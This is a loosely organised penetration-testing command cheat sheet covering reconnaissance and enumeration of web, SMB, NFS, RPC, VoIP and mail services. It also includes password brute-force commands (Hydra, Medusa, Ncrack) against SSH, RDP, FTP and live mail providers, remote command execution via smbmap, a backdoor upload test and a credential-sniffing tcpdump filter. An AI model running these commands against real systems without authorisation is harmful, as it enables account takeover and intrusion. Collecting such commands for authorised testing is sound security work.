wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ



##-========================================-##
##    [+] Uniscan directory finder
##-========================================-##
uniscan -qweds -u <<http://vm/>>




## ---------------------------------------------------------------------------------------------- ##
###  [?] Parsero - reads the Robots.txt file of a web server and looks at the Disallow entries.
## ---------------------------------------------------------------------------------------------- ##
parsero -u $Domain -sb


## -------------------------------------------- ##
###  [?] ffuf - bruteforce web directories
## -------------------------------------------- ##
ffuf -w /path/to/wordlist -u https://target/FUZZ


## ------------------------------------------------------ ##
###  [?] tries to upload (executable) files to webdav
## ------------------------------------------------------ ##
davtest -url http://target-ip/ -sendbd auto




##-===========================-##
##  [+] Skipfish Scanning:
##-===========================-##
## ---------------------------------------------- ##
##  skipfish -m     time threads
##  skipfish -LVY   do not update after result
## ---------------------------------------------- ##
skipfish -m 5 -LVY -W /usr/share/skipfish/dictionaries/complete.wl -u http://$IP




skipfish -o /tmp/$File $Domain








urlsnarf

cisco-torch

knocker





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##      [+] Wordpress - Vulnerability Scanning + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


##-==================================================-##
##   [+] WPScan - Wordpress Vulnerability Scanner
##-==================================================-##
wpscan -v --url $1 --update -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive -f cli-no-color 2>&1 | tee /var/log/$WPScan.log



##-=============================================-##
##   [+] THC-Hydra - Brute Force - Wordpress
##-=============================================-##
hydra -v http://site.com/ http-form-post "wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location" l admin -P password_path






vuls





wapiti $Domain -n 10 -b folder -u -v 1 -f html -o /tmp/scan_report





## --------------------------------- ##
##  [+] Scraping wayback data...
## --------------------------------- ##
cat $url/recon/final.txt | waybackurls | tee -a  $url/recon/wayback/wayback_output1.txt
sort -u $url/recon/wayback/wayback_output1.txt >> $url/recon/wayback/wayback_output.txt


cat domains.txt | waybackurls > urls




inurlbr.php --dork "site:$Target" -s inurlbr-$Target

inurlbr.php --dork "filetype:jsp | filetype:bak | filetype:asp | filetype:php | filetype:cgi | filetype:sql | filetype:pl | filetype:py | filetype:aspx | filetype:rb | filetype:do' inurl:'$TARGET' site:'$TARGET'" -s $TARGET-extensions.txt
inurlbr.php --dork '(inurl:"redir=" AND inurl:"http") OR (inurl:"url=" AND inurl:"http") OR (inurl:"target=" AND inurl:"http") OR (inurl:"dst=" AND inurl:"http") OR (inurl:"src=" AND inurl:"http") OR (inurl:"redirect=" AND inurl:"http") AND site:'"$TARGET" -s $TARGET-openredirect.txt
inurlbr.php --dork "'site:pastbin.com' $TARGET" -s $TARGET-pastebin.txt



urlcrazy -k $Layout -i -o $Location $URL




## ------------------------------------------------------- ##
##   [?] Please provide a file containing target urls.
## ------------------------------------------------------- ##
EyeWitness.py --web -f $1


## --------------------------------------------------------- ##
##   [?] Running eyewitness against all compiled domains
## --------------------------------------------------------- ##
EyeWitness --web -f $url/recon/httprobe/alive.txt -d $url/recon/eyewitness --resolve


EyeWitness.py --web -f hosts.txt --timeout 5 --threads 10 -d /mnt/event/Recon/ew --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https



## ------------------------------------------------------- ##
##   [?] Please provide URLs file to capture, 
##   [?] a Dir name for output and a User-Agent string.
## ------------------------------------------------------- ##
EyeWitness.py --web -f "$1" -d "$2" --user-agent "$3" --prepend-https --no-prompt








## ----------------------------------- ##
###  [?] whatweb - Vulnerable Scan
## ----------------------------------- ##
whatweb $IP





ass -A -i eth0 -v     Active mode scanning





## --------------------------------------------------------------------- ##
##    [?] Fierce
## --------------------------------------------------------------------- ##
fierce -dns $Domain


## --------------------------------------------------------------------- ##
##    [?] Firewalk - active reconnaissance network security tool 
## --------------------------------------------------------------------- ##
firewalk -S8079-8081  -i eth0 -n -pTCP 192.168.1.1 192.168.0.1



## --------------------------------------------------------------------- ##
##    [?] GoLismero - 
## --------------------------------------------------------------------- ##
golismero scan -i /root/port80.xml -o sub1-port80.html





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##     [+] RPC - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-==========================-##
##   [+] Services Running
##-==========================-##
rpcinfo –p; $IP
rpcbind -p rpcinfo –p x.x.x.x


##-===========================================-##
##   [+]
##-===========================================-##
rpcinfo -p | egrep -w "port|81[14]"


##-======================================================-##
##   [+] Connect to an RPC share without a
##      username and password and enumerate privileges
##-======================================================-##
rpcclient --user="" --command=enumprivs -N $IP


##-===========================================-##
##  [+] Connect to an RPC share with a
##      username and enumerate privileges
##-===========================================-##
rpcclient --user="" --command=enumprivs $IP


## dump rpc endpoints
/opt/impacket/examples/rpcdump.py username:password@target-ip


## get sid via rpc
/opt/impacket/examples/lookupsid.py username:password@target-ip



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##      [+] NFS - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##




rpc.idmapd - The NFSv4 ID <-> name mapping daemon
rpc.idmapd — NFSv4 ID <-> Name Mapper


/etc/idmapd.conf


rpc.idmapd -f -vvv

     Runs rpc.idmapd printing all messages to console, and with a verbosity level of 3.



nfsidmap



##-==========================-##
##   [+] Find NFS Port
##-==========================-##
nmap -p 111 --script=rpcinfo.nse -vv -oN nfs_port; $IP


##-==========================-##
##   [+] Show NFS Mounts
##-==========================-##
nmap -sV --script=nfs-showmount $IP


##-===================================-##
##   [+] Show Mountable NFS Shares
##-===================================-##
nmap --script=nfs-showmount -oN mountable_shares; $IP; showmount -e; $IP


mount $TARGET:/vol/share /mnt/nfs

mount -t nfs $IP:/var/myshare /mnt/shareddrive
mount -t nfs $IP:/mountlocation /mnt/mountlocation

serverip:/mountlocation /mnt/mountlocation nfs defaults 0 0


mount -o port=2049,mountport=44096,proto=tcp 127.0.0.1:/home /home


## -------------------------------------------------------------------- ##
##   [?] discover available Windows shared drives or for NFS shares.
## -------------------------------------------------------------------- ##
net view \\<remote system>
showmount -e                    ## list Shares









##-=============================================-##
##  [+] Shutdown a Windows machine from Linux

net rpc shutdown -I ipAddressOfWindowsPC -U username%password










##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SMB - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-===========================-##
##   [+] Connect to share
##-===========================-##
smbclient \\\\[$IP\]\\\[share name\]


##-==================================================-##
##   [+] test server credentials using $AUTH_FILE
##-==================================================-##
smbclient -L $p -A $AUTH_FILE


##-===========================-##
##   [+] 
##-===========================-##
smbclient -L\\ -N -I $1 2>&1 | tee "smbclient_$1.txt"


##-===========================-##
##  [+] Enumerate Hostnames
##-==========================-##
nmblookup -A $IP

nmblookup -U $Domain -R '$Workgroup'


##-==========================-##
##   [+] Investigate share
##-==========================-##
smblookup -A $TARGET smbclient //MOUNT/share -I $TARGET -N




##-==============================-##
##  [+] List Shares with creds
##-==============================-##
smbmap -H \[$IP\] -d \[domain\] -u \[user\] -p \[password\] -r --depth 5 -R


##-====================================================-##
##   [+] List Shares with no creds and guest account
##-====================================================-##
smbmap -H \[$IP/hostname\] -u anonymous -p hokusbokus -R


##-============================================-##
##   [+] Guest User and null authentication
##-============================================-##
smbmap -u anonymous -p anonymous -H 10.10.10.172
smbmap -u '' -p '' -H 10.10.10.172


##-================================-##
##   [+] List Shares with creds
##-================================-##
smbmap -H \[ip\] -d \[domain\] -u \[user\] -p \[password\] -r --depth 5 -R



smbmap -H [ip] -d [domain] -u [user] -p [password]   -r --depth 5 -R




smbmap -H $1 -P $2 2>&1 | tee -a "smbmap-share-permissions_$1_$2.txt"
smbmap -u null -p "" -H $1 -P $2 2>&1 | tee -a "smbmap-share-permissions_$1_$2.txt"


smbmap -H $1 -P $2 -x "ipconfig /all" 2>&1 | tee -a "smbmap-execute-command_$1_$2.txt"
smbmap -u null -p "" -H $1 -P $2 -x "ipconfig /all" 2>&1 | tee -a "smbmap-execute-command_$1_$2.txt"





##-=====================================-##
##   [+] semi-interactive smb-client
##-=====================================-##
python3 /opt/impacket/examples/smbclient.py username@target-ip
python3 /opt/impacket/examples/smbclient.py 'username'@target-ip
python3 /opt/impacket/examples/smbclient.py ''@target-ip



##-==========================-##
##   [+] Find open shares
##-==========================-##
Showmount -e $TARGET/<port>


##-=========================-##
##   [+] Mount smb share:
##-=========================-##
mount -t cifs //server ip/share/dir/; -o username=”guest”,password=””

mount -o hard,nolock target-ip:/home folder

mount -t cifs -o user=username,domain=domainname //target-ip/share /mnt/folder


##-===========================================-##
##   [+] Mount Linux/Windows CIFS Server
##-===========================================-##
Mount -t cifs //<server ip>/<share> <local dir> -o username=”guest”,password=””
C:\>net use Z: \\win-server\share password /user:domain\janedoe /savecred /p:no


##-===================================-##
##   [+] Mount Remote Windows Share:
##-===================================-##
smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw



smbtree -NS 2>/dev/null
nbtscan -r <current_IPrange>
netdiscover -r <current_IPrange>
nmap -n -Pn -T5 -sS <current_IPrange>




##-========================================-##
##   [+] NBTScan - Netbios Enumeration:
##-========================================-##
nbtscan -r 192.168.0.1-100
nbtscan -f $HostFile.txt


##-=======================================================-##
##   [+] NBT name scan for addresses from 10.0.2.0/24
##-=======================================================-##
nbtscan -r 10.0.2.0/24


##-=======================================-##
##   [+] Netbios Information Scanning
##-=======================================-##
nbtscan -r $IP/24


##-===========================================-##
##   [+] Find Service Provided By Machines:
##-===========================================-##
nbtscan -hv $IP/24


##-========================================-##
##   [+] Show logged in users/addresses
##-========================================-##
nbtscan $TARGET -R 54



##-===========================================-##
##   [+] Nmap - find exposed Netbios servers
##-===========================================-##
nmap -sU --script nbstat.nse -p 137 $IP


##-========================================-##
##   [+] Nmap - Check target for Netbios vulns
##-========================================-##
nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 $IP

##-===========================================-##
##   [+] Nmap - Enumerate SMB Users
##-===========================================-##
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $IP-14


##-==============================================-##
##   [+] Nmap - List SMB Shares with no creds
##-==============================================-##
nmap --script smb-enum-shares -p 139,445 $IP
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24   


##-====================================-##
##   [+] Nmap - Enumerate SMB users
##-====================================-##
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.0/24
python /usr/share/doc/python-impacket-doc/examples/samrdump.py $TARGET


##-========================================-##
##   [+] Nmap - SMB Vulnerability Scans
##-========================================-##
nmap --script="+\*smb\* and not brute and not dos and not fuzzer" -p 139,445 -oN smb-vuln; $IP


##-========================================-##
##   [+] Nmap - Search for SMB vulns
nmap -p139,445 $IP --script smb-vuln*




$HOME/.wireshark



wireshark --interface wlo1  -k -z -w  /var/log/wireshark.log 





--log-level "debug"



##  Write log messages and stderr output to the specified file
--log-file /var/log/wireshark.log



Only print messages for the specified log domains

--log-domains 






-z smb,srt[,filter]

Collect call/reply SRT (Service Response Time) data for SMB. 





-z "smb,srt,ip.addr==1.2.3.4"

collect stats only for SMB packets exchanged by the host at IP address 1.2.3.4







shows VoIP calls found in the capture file

-z voip,calls




-z wlan,stat[,<filter>]

           Show IEEE 802.11 network and station statistics




dumpcap
tcpcapinfo
getpcaps

ivstools
log2pcap

pcap-filter
pcapdump        
pcapfix         
pcapip          
pcappick        
pcapuc          
rawshark        
tcpliveplay     
tcpprep         
tcpreplay       
tcpreplay-edit  
tcprewrite      
tcpslice        

tcptrace (1)       
tcptracer-bpfcc (8)
tcptraceroute (1)  
tcptraceroute.db (8
tcptraceroute.mt (1
tcptrack (1)       
tcpxtract (1)      
tctrace
tcpslice (1)       
tcpstat

tcpflow (1)        
tcpick (8)         
tcpkill (8)        
tcplife.bt (8)     
tcplife-bpfcc (8)  
tcpnice (8)        
tcpprof (1)        
tcpreen

afl-gotcpu (8)     

rpc_soc (3t)       
clock_getcpuclockid
dns2tcpc (1)       
dns2tcpd (1)       
faked-tcp (1)      
fakeroot-tcp (1)   
tcpbridge (1)      
tcpcapinfo (1)     
tcpliveplay (1)    
tcpprep (1)        
tcpreplay (1)      
tcpreplay-edit (1) 
tcprewrite (1)     
flowgrind (1)      
flowgrind-stop (1) 
flowgrindd


















## ---------------------------------------------------------------------------------- ##
##    [?] SMB password dictionary attack tool that targets windows authentication
## ---------------------------------------------------------------------------------- ##
acccheck.pl -T smb-ips.txt -v



hydra  -v  -l Administrator -P fpass.lst smb://11.1.11.1 >> brute_smb.out
medusa -h 192.168.0.20 -u administrator -P passwords.txt -e ns -M smbnt >> brute_smb.out
hydra -L user.txt -P pass.txt -e ns -f -v -V -w5 10.10.10.2 smb >> brute_smb.out





##-=========================================================-##
##  [+] enum4linux - Enumerate using SMB (null session)
##-=========================================================-##
enum4linux -a $IP


##-=========================================================-##
##  [+] enum4linux - Enumerate using SMB (w/user & pass)
##-=========================================================-##
enum4linux -a -u $User -p $Pass $IP


##-===============================-##
##  [+] enum4linux - bash-loop
##-===============================-##
for targets in $(cat $File.txt); do enum4linux $targets; done


##-====================================-##
##  [+] enum4linux - 
##-====================================-##
enum4linux -a -v -M -l -d $1


##-====================================-##
##  [+] enum4linux - 
##-====================================-##
enum4linux -a -v -M -l -d $1 2>&1 | tee "enum4linux_$1.txt"




nbtscan-unixwiz -f $TARGET




##-========================================-##
##  [+] RDP
##-========================================-##
rdesktop -u admin -p password $TARGET




## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] Braa is a mass snmp scanner
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
braa public@192.168.1.215:.1.3.6.*




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] VoIP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-=========================================================================================-##
##   [+] ACE (Automated Corporate Enumerator) - VoIP Corporate Directory enumeration tool
##-=========================================================================================-##

##-===================================================================-##
##   [+] automatically discover TFTP Server IP via DHCP Option 150
##-===================================================================-##
ace -i eth0 -m 00:1E:F7:28:9C:8e


##-===========================================-##
##   [+] specify IP Address of TFTP Server: 
##-===========================================-##
ace -i eth0 -t 192.168.10.150 -m 00:1E:F7:28:9C:8e


##-===================================-##
##   [+] specify the Voice VLAN ID: 
##-===================================-##
ace -i eth0 -v 96 -m 00:1E:F7:28:9C:8E

##-======================-##
##   [+] Verbose mode: 
##-======================-##
ace -i eth0 -v 96 -m 00:1E:F7:28:9C:8E -d

##-===============================-##
##   [+] remove vlan interface: 
##-===============================-##
ace -r eth0.96

##-==================================================================-##
##   [+] auto-discover voice vlan ID in the listening mode for CDP: 
##-==================================================================-##
ace -i eth0 -c 0 -m 00:1E:F7:28:9C:8E

##-==================================================================-##
##   [+] auto-discover voice vlan ID in the spoofing mode for CDP: 
##-==================================================================-##
ace -i eth0 -c 1 -m 00:1E:F7:28:9C:8E





sipvicious
audit SIP based VoIP systems

svmap, svwar, svcrack, svreport, svcrash.

svmap - sip scanner used to identify any SIP servers

svwar identifies working extension lines on a PBX.




iaxflood - VoIP flooder tool -  IAX payload.



protos-sip - SIP test suite



voiphopper

yersinia
siparmyknife
sctpscan




cisco-auditing-tool
Scans Cisco routers for vulnerabilities








## --------------------------------------------------------- ##
##    [?] ohrwurm - RTP fuzzer that targets SIP phones
## --------------------------------------------------------- ##



## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] CDPSnarf is a network sniffer exclusively written to extract information from CDP packets.
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
cdpsnarf -i eth0 -w cdpsnarf.pcap





##  show which user recently logged in
for i in $(cat users);do finger $i $i@192.168.78.148;done


##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SMTP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##






smtp-user-enum -M VRFY -U $USER_FILE -t $TARGET


for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "smtp" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=25 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;



nmap -p 25 --script=smtp-* $TARGET
nmap --script smtp-enum-users.nse --script-args smtp-enum-users.methods={VRFY} -p 25 10.11.1.22


## show which users are on the system.
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.78.148
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 10.11.1.22 -v


# Test for SMTP user enumeration (RCPT TO and VRFY), internal spoofing, and relay.
ismtp -f smtp-ips.txt -e /usr/share/wordlists/metasploit/unix_users.txt


smtprecon.py 10.11.1.22


use auxiliary/scanner/smtp/smtp_enum


hydra -L $USER_FILE -P $PASS_FILE $TARGET smtp -f 


SMTP :
medusa -M smtp -m AUTH:NTLM -U accounts.txt -p password
medusa -M smtp -m EHLO:world -U accounts.txt -p password


SMTP VRFY :
medusa -M smtp-vrfy -m VERB:VRFY -U accounts.txt -p domain.com
smtp-user-enum -M VRFY -U /home/weak_wordlist/userall.txt -t 192.168.3.10


SMTP RCPT TO :
medusa -M smtp-vrfy -m VERB:RCPT TO -U accounts.txt -p domain.com


patator.py smtp_vrfy timeout=15 host=10.11.1.22 user=FILE0 0=/usr/share/seclists/Usernames/Names/names.txt


hydra server smtp -l example@gmail.com -P wordlist -s port -S -v -V

hydra smtp.gmail.com smtp -l example@gmail.com -P /home/user/Desktop/rockyou.txt -s 465 -S -v -V



smtp-user-enum -M VRFY -U $USER_FILE -t $TARGET




##-=============================================-##
##   [+] Connect to SMTP server using STARTTLS
##-=============================================-##
openssl s_client -starttls smtp -crlf -connect 127.0.0.1:25
openssl s_client -connect smtp.office365.com:587 -starttls smtp
gnutls-cli-debug --starttls-proto smtp --port 25 localhost



##-=========================================-##
##   [+]
##-=========================================-##
openssl s_client -connect smtp.gmail.com:587 -starttls smtp < /dev/null 2>/dev/null |
openssl x509 -fingerprint -noout -in /dev/stdin | cut -d'=' -f2


##-=========================================-##
##   [+]
##-=========================================-##
openssl s_client -showcerts -starttls smtp -connect smtp_relay:smtp_relay_port < /dev/null 2> /dev/null


##-=========================================-##
##   [+]
##-=========================================-##
sudo -u postfix openssl s_client -showcerts -starttls smtp -connect smtp.gmail.com:587 < /dev/null 2> /dev/null


##-=========================================-##
##   [+]
##-=========================================-##
openssl s_client -CApath /etc/ssl/certs -showcerts -starttls smtp -connect smtp_relay:smtp_relay_port < /dev/null 2> /dev/null














xsstracer $TARGET 80
















tcpdump -i eth0 port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep –i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=||name=|name:|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] POP3 - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "pop" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=110 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;


nmap -p 110 --script=pop3-* $TARGET



##-=======================================-##
##   [+] THC-Hydra - Brute Force - POP3
##-=======================================-##
hydra -L $USER_FILE -P $PASS_FILE $TARGET pop3 -f 




medusa -M pop3 -m MODE:AS400 -U accounts.txt -p password
medusa -M pop3 -m DOMAIN:foo.com -U accounts.txt -p password
hydra -l muts -P pass.txt my.pop3.mail pop3 >> brute_pop3.out
hydra -S -l myemailaddress@hotmail.co.uk -P password.lst pop3.live.com -s 995 pop3 >> brute_pop3.out




##-=========================================-##
##   [+] secure POP:
##-=========================================-##
openssl s_client -quiet -connect $Domain:995
openssl s_client -crlf -connect server.server.net:110 -starttls pop3




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] IMAP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##







##-=========================================-##
##   [+] secure IMAP:
##-=========================================-##
openssl s_client -quiet -connect $Domain:993
openssl s_client -ssl3 -connect imap.gmail.com:993
gnutls-cli imap.gmail.com -p 993




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] FTP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##






nmap -n -Pn -sV $IP -p $PORT --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -oN $OUTPUT/ftp_$IP-$PORT.nmap


nmap -p 21 --script="+\*ftp\* and not brute and not dos and not fuzzer" -vv -oN ftp &gt; $ip

nmap -n -Pn -sV $IP -p $PORT --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -oN $OUTPUT/ftp_$IP-$PORT.nmap




##-=======================================-##
##   [+] THC-Hydra - Brute Force - FTP
##-=======================================-##


hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -f -o $OUTPUT/ftphydra_$IP-$PORT -u $IP -s $PORT ftp"


hydra -L username.txt -P passlist.txt ftp://<IP-ADDRESS
hydra -l user -P passlist.txt ftp://<IP-ADDRESS

hydra -l superuser -P pwd.txt -v -f -e ns -t 5 -w 20 192.168.67.132 ftp >> brute_ftp.out
hydra -t 5 -V -f -l root -P common.txt ftp://192.168.67.132 >> brute_ftp.out
hydra -v -f -l ftp -P fpass.lst -t 10 ftp://11.11.11.11 >> brute_ftp.out
hydra -l root -P 500-worst-passwords.txt 10.10.10.10 ftp
medusa -u test -P 500-worst-passwords.txt -h 10.10.10.10 -M ftp
medusa -M ftp -h host -u username -p password


patator ftp_login host=$line user=FILE0 0=$USERNAME password=FILE1 1=$PASSWORD -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500

patator ftp_login host=$line user=FILE0 0=$USERNAME password=FILE1 1=$PASSWORD -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500


patator ssh_login host=$line user=FILE0 0=$USERNAME password=FILE1 1=$PASSWORD --max-retries 0 --timeout 10 -x ignore:time=0-3



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] RDP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-=======================================-##
##   [+] THC-Hydra - Brute Force - RDP
##-=======================================-##


hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp



medusa -u administrator -P /usr/share/john/password.lst -h 10.10.10.71 -M rdp
ncrack -p rdp -u administrator --pass 'password' -iL in2
hydra -v -f -l administrator -P common.txt rdp://192.168.67.132 // not good
ncrack -vv --user offsec -P password-file.txt rdp://10.10.10.10



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SSH - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##

medusa -h 10.10.XX -P /root/pasword.txt -u root -M ssh
ncrack -p ssh -u root --pass 'root' -iL in



##-=======================================-##
##   [+] THC-Hydra - Brute Force - SSH
##-=======================================-##
hydra -t 5 -V -f -l root -P common.txt localhost ssh >> brute_ssh.out
hydra -v -l root -P 500-worst-passwords.txt 10.10.10.10 ssh >> brute_ssh.out
hydra -v -l root -P fpass.lst -t 5 ssh://ip -o brute_ssh.out








iptraf -i "wlan0"




wpscan --url www.vyxunbnbs.com/mobile --enumerate u
 --url $ip/blog --proxy $ip:3129


routersploit


Metasploit Scanning

auxiliary/scanner/*

portscan/tcp
http/http_version
http/tomcat_enum
http/trace_axd






EyeWitness
eyewitness --web						##  HTTP Screenshot using Selenium
eyewitness -f $File						##  Line-separated file containing URLs to capture
eyewitness -x $File.xml				##  Nmap XML or .Nessus file
eyewitness --single $URL			##  Single URL/Host to capture
eyewitness --proxy-type socks5 --proxy-ip 10.64.0.1 --proxy-port 1080				##  
eyewitness --proxy-type socks5 --proxy-ip 10.8.0.1 --proxy-port 1080				##  
eyewitness --difference				##  
eyewitness --user-agent				##  
eyewitness -d /$Dir/ 				##  
eyewitness --max-retries 5				##  
--only-ports 443,1080




https://github.com/ChrisTruncer/Just-Metadata



daemonlogger darkstat 
dns_browse dnsbulktest dnsenum dnsgram dnshistory dnsmap dnsping dnsrecon dbus-send dnsscan dnsscope dnssec-trust-anchors.d dnsspoof dnstap-read  
dnstap-read dnstcpbench dnstop dnstracer dnstraceroute dns_tree dnstwist dnswalk dnswasher dnsdomainname dnseval nss-tlsd pdns_notify resolvectl sdig systemd.dnssd unbound-host validns 

dhcpdump dhcpig dhcp-options danetool dhcpd.conf dane_verification_status_print dirb dmitry 
dialog

People Search
Switchboard - http://www.switchboard.com/person

Zaba - http://www.zabasearch.com/










spyse -target $Target --subdomains


Get Autonomous System details
echo "AS15169" | spysecli as

Get IPv4 host details
echo "8.8.8.8" | spysecli ip

Reverse IP lookup
echo "8.8.8.8" | spysecli reverse-ip

Reverse NS lookup
echo "ns1.google.com" | spysecli reverse-ns

Subdomains lookup
echo "tesla.com" | spysecli subdomains



curl -s https://crt.sh/?q=%25.$Target

Get historical DNS A records
echo "google.com" | spysecli history-dns-a

Get historical DNS NS records
echo "google.com" | spysecli history-dns-ns




curl -s "https://certspotter.com/api/v0/certs?domain=$1" | jq '.[].dns_names[]' 2> /dev/null | sed 's/\"//g' | sed 's/\*\.//g' | grep -w $1\$ | sort -u >> tmp.txt &
curl -s "https://crt.sh/?q=%.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

dnsdumpster.com

censys.io/domain?q=
censys.io/certificates?q=


curl -s "https://www.virustotal.com/ui/domains/$1/subdomains?limit=40" | grep '"id":' | cut -d '"' -f4 | sort -u

curl https://www.virustotal.com/en/domain/$target/information/ -H 'Host: www.virustotal.com' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -m 30 | grep information | grep "$target" | awk '{print $3}' | sed 's/\// /g' | awk '{print $4}' >> /tmp/onlineFoundSubdomains


https://api.hackertarget.com/pagelinks/?q=
https://api.hackertarget.com/hostsearch/?q=


curl https://api.hackertarget.com/whois/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/nping/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/findshareddns/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/nmap/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/geoip/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/zonetransfer/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/httpheaders/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/hostsearch/?q=$hostname --connect-timeout 15
